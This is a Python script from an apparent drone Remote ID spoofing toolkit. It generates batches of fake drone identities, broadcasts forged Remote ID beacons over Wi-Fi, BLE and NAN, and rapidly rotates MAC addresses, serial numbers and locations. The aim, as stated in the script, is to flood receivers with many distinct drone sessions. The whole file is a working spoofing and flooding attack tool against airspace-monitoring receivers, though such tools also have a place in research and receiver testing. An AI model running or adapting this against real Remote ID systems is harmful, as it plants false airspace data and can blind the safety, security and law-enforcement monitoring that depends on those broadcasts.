#!/usr/bin/env python3
"""
Ephemeral Swarm Experiment: Rapidly spawns batches of fake drone identities, 
transmits a tiny number of beacons per drone (e.g. 1 to 3 packets), and immediately
rotates MAC addresses, serial numbers, and locations to flood receivers with massive
numbers of distinct drone sessions across multiple physical transports simultaneously.
"""
import argparse
import logging
import sys
import time
from datetime import datetime

from drone_rid_spoofer.cli import create_backends, DEFAULT_LAT, DEFAULT_LNG
from drone_rid_spoofer.helpers import (
    ParseLocationAction,
    generate_ble_mac,
    generate_wifi_mac,
    get_random_pilot_location,
    get_random_serial_number,
    random_location,
    random_speed,
    random_vertical_speed,
    random_altitude,
)
from drone_rid_spoofer.messages import build_all_messages
from drone_rid_spoofer.state import DroneState

logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s: %(message)s')


def seed_kinematics(drone: DroneState) -> None:
    drone.speed = float(random_speed())
    drone.vertical_speed = float(random_vertical_speed())
    alt_p, alt_g, height = random_altitude()
    drone.pressure_altitude = float(alt_p)
    drone.geodetic_altitude = float(alt_g)
    drone.height = float(height)
    drone.direction = int(time.time() * 100) % 360


def generate_wave(count: int, base_lat: int, base_lng: int) -> list:
    drones = []
    for _ in range(count):
        serial = get_random_serial_number()
        lat, lng = random_location(base_lat, base_lng, 20000)  # ~2km random spread
        pilot_loc = get_random_pilot_location(lat, lng)
        mac_addr = generate_wifi_mac()
        ble_addr = generate_ble_mac()

        drone = DroneState(
            serial=serial,
            pilot_location=pilot_loc,
            lat=lat,
            lng=lng,
            mac_address=mac_addr,
            ble_address=ble_addr,
            mode="hover"
        )
        seed_kinematics(drone)
        drones.append(drone)
    return drones


def main() -> None:
    parser = argparse.ArgumentParser(description="Ephemeral Swarm Injection (Rapid MAC/ID Rotation)")
    parser.add_argument("-t", "--transport", choices=["wifi", "ble", "nan", "both", "all"], default="wifi",
                        help="Transport medium(s) to broadcast on simultaneously (default: wifi)")
    parser.add_argument("-b", "--batch-size", type=int, default=30,
                        help="Number of concurrent ephemeral drones per wave (default: 30)")
    parser.add_argument("-k", "--packets-per-drone", type=int, default=2,
                        help="Number of packet broadcast cycles before tearing down and rotating identities (default: 2)")
    parser.add_argument("-n", "--interval", type=float, default=0.2,
                        help="Transmission interval in seconds between packet cycles (default: 0.2s)")
    parser.add_argument("-l", "--location", nargs=2, metavar=("LATITUDE", "LONGITUDE"),
                        action=ParseLocationAction, default=(DEFAULT_LAT, DEFAULT_LNG),
                        help="Baseline GPS coordinates (decimal degrees)")
    parser.add_argument("-i", "--interface", default="wlan1",
                        help="Wi-Fi monitor interface (default: wlan1)")
    parser.add_argument("--ble-adapter", default="hci0",
                        help="BLE adapter name (default: hci0)")
    parser.add_argument("--ble-legacy", action="store_true",
                        help="Use BLE 4 Legacy Advertising only")
    parser.add_argument("--ble-dual", action="store_true",
                        help="Use dual broadcast of both BLE 4 and BLE 5")
    parser.add_argument("--nan-port", type=int, default=8080,
                        help="TCP port for NAN Android bridge (default: 8080)")
    parser.add_argument("--no-self-id", action="store_true", default=False,
                        help="Omit Self ID message to reduce packet overhead")
    parser.add_argument("--no-operator-id", action="store_true", default=False,
                        help="Omit Operator ID message")
    parser.add_argument("--wifi-channel", type=int, default=6,
                        help="Wi-Fi channel (default: 6)")
    args = parser.parse_args()

    logging.info(f"Starting Ephemeral Swarm on transport: [{args.transport.upper()}]")
    logging.info(f"Configuration: {args.batch_size} concurrent drones/wave | Rotating after every {args.packets_per_drone} packet(s)")
    logging.info(f"Transmission cycle interval: {args.interval}s (Wave duration: {args.packets_per_drone * args.interval:.2f}s)")

    backends = create_backends(
        transport=args.transport,
        interface=args.interface,
        ble_adapter=args.ble_adapter,
        ble_interval=int(args.interval * 1000),
        ble_legacy=args.ble_legacy,
        ble_dual=args.ble_dual,
        wifi_ess=False,
        wifi_channel=args.wifi_channel,
        wifi_beacon_interval=args.interval,
        nan_port=args.nan_port,
        update_interval=args.interval
    )

    packet_builder = lambda drone: build_all_messages(
        drone,
        omit_self_id=args.no_self_id,
        omit_operator_id=args.no_operator_id
    )

    # Initialize first wave
    active_drones = generate_wave(args.batch_size, args.location[0], args.location[1])
    for backend in backends:
        backend.start(active_drones, packet_builder)

    wave_count = 1
    total_unique_drones = args.batch_size
    wave_duration = args.packets_per_drone * args.interval

    try:
        while True:
            logging.info(f"Wave #{wave_count}: Broadcasting {len(active_drones)} active identities (Total unique injected: {total_unique_drones})...")
            
            # Let the backend threads transmit for the duration of K packets
            time.sleep(wave_duration)
            
            # Prepare new wave of fresh identities
            new_wave = generate_wave(args.batch_size, args.location[0], args.location[1])
            old_wave = list(active_drones)
            
            # In-place atomic swap of active drone references for the backend broadcast threads
            active_drones[:] = new_wave
            
            # Clean up tracking dictionaries and sessions for the expired wave in all backends
            for drone in old_wave:
                for backend in backends:
                    backend.remove_drone(drone)

            wave_count += 1
            total_unique_drones += args.batch_size

    except KeyboardInterrupt:
        logging.info(f"Ephemeral swarm interrupted by user. Injected {total_unique_drones} unique drone identities across {wave_count} waves.")
    finally:
        for backend in backends:
            backend.close()
        logging.info("All transport backends cleanly shut down.")


if __name__ == "__main__":
    main()
